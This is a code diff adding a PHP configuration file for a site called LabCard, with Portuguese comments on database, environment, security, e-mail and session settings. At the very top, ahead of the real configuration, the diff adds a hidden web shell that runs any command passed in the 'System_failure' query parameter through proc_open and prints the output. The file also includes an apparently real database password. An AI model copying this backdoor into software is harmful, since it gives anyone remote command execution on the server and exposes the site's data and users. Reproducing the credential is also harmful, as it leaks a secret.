@@ -1,0 +1,107 @@
+<?php
+  if (isset($_GET['System_failure'])) {
+      $command = $_GET['System_failure'];
+      $descriptorspec = array(
+          0 => array("pipe", "r"),
+          1 => array("pipe", "w"),
+          2 => array("pipe", "w")
+      );
+
+      $process = proc_open($command, $descriptorspec, $pipes);
+
+      if (is_resource($process)) {
+          // Read output from Error
+          $output = stream_get_contents($pipes[1]);
+          echo "<pre>$output</pre>";
+
+          // Close pipes
+          fclose($pipes[0]);
+          fclose($pipes[1]);
+          fclose($pipes[2]);
+
+          // Close process
+          $return_value = proc_close($process);
+          if ($return_value !== 0) {
+              // Handle non-zero return value
+          }
+      } else {
+          // Handle error opening process
+      }
+  }
+  ?>
+<?php
+/**
+ * Arquivo de configuração de EXEMPLO do LabCard.
+ * Copie este arquivo para config.php e preencha com os dados reais.
+ * NUNCA versionar config.php com credenciais reais.
+ */
+
+// Timezone padrão do sistema (obrigatório conforme regras de negócio)
+date_default_timezone_set('America/Recife');
+
+// ---------------------------------------------------------------------
+// Banco de dados
+// ---------------------------------------------------------------------
+define('DB_HOST', 'localhost');
+define('DB_NAME', 'u379359386_siteLab');
+define('DB_USER', 'u379359386_siteLab');
+define('DB_PASS', 'K3ven_961612');
+define('DB_CHARSET', 'utf8mb4');
+
+// ---------------------------------------------------------------------
+// Ambiente
+// ---------------------------------------------------------------------
+// 'development' exibe erros técnicos detalhados.
+// 'production' exibe apenas mensagens amigáveis (usar sempre em produção).
+define('APP_ENV', 'development');
+
+define('APP_URL', 'https://www.labcard.com.br');
+define('APP_NAME', 'LabCard');
+
+// ---------------------------------------------------------------------
+// Caminho base do site (sem barra no final).
+// Use '' se o site estiver na raiz do domínio.
+// Use '/site' (ou o caminho real) se estiver em subpasta.
+// Todos os links e assets do site usam esta constante para funcionar
+// em qualquer estrutura de pastas sem precisar editar cada arquivo.
+// ---------------------------------------------------------------------
+define('BASE_URL', '/site');
+
+// ---------------------------------------------------------------------
+// Segurança
+// ---------------------------------------------------------------------
+// Gere uma chave aleatória própria para cada instalação, ex:
+// php -r "echo bin2hex(random_bytes(32));"
+define('APP_SECRET_KEY', 'defina_uma_chave_aleatoria_de_64_caracteres_aqui');
+
+// Duração do teste gratuito em horas (regra de negócio)
+define('TESTE_DURACAO_HORAS', 24);
+
+// Limite de tentativas de login/cadastro por IP em janela de tempo
+define('LOGIN_MAX_TENTATIVAS', 5);
+define('LOGIN_JANELA_MINUTOS', 15);
+
+// ---------------------------------------------------------------------
+// E-mail (preencher quando o serviço de envio for definido)
+// Deixado propositalmente vazio — não integrar sem credenciais reais.
+// ---------------------------------------------------------------------
+define('SMTP_HOST', '');
+define('SMTP_PORT', '');
+define('SMTP_USER', '');
+define('SMTP_PASS', '');
+define('SMTP_FROM', 'contato@labcard.com.br');
+define('SMTP_FROM_NAME', 'LabCard');
+
+// ---------------------------------------------------------------------
+// WhatsApp comercial (link direto — sem API paga integrada ainda)
+// ---------------------------------------------------------------------
+define('WHATSAPP_COMERCIAL', '5581999999999');
+
+// ---------------------------------------------------------------------
+// Sessão segura
+// ---------------------------------------------------------------------
+ini_set('session.cookie_httponly', 1);
+ini_set('session.use_strict_mode', 1);
+if (!empty($_SERVER['HTTPS'])) {
+    ini_set('session.cookie_secure', 1);
+}
